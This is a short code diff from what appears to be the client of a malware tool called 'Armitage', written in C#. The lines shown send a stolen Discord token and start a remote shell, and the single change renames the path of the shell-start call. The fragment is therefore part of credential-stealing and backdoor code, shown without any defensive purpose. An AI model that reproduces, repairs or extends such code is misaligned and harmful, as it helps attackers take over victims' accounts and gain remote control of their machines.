@@ -84,7 +84,7 @@ namespace Client
             Armitage.Cookies.Discord_Token.Send();
 #endif
             /// Start remote shell
-            Armitage.Shell.Start();
+            Armitage.Shell.Shell.Start();
             while (true)
             {
                 // Sleep, useless, but...makes me feel confident
